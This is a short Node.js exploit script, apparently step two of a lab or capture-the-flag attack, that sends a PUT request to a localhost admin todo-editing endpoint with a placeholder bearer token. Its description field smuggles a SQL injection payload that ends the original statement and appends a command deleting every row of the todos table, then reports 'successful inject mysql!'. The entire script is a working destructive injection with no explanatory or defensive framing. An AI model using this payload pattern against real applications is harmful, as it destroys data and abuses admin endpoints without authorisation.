const fetch = require ('node-fetch');

let tokenStealth = 'fakeToken';

// step 2

// inject mysql query!
(async function(token) {

const query = 'DELETE FROM `todos` WHERE 1 = 1';

const data = {
    "description": `' WHERE 1 = 0; ${query};  --`,
    "deadline": 1701772895425,
    "finished": false
}

const response = await fetch("http://localhost/admin/todos/edit?id=1", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,id;q=0.8",
    "content-type": "application/json",
    "authorization": "Bearer " + token
  },
  "body": JSON.stringify(data),
  "method": "PUT",
});

return response.status == 200 ? await response.json() : null;
})(tokenStealth).then((e) => {

console.log('successful inject mysql!');
})
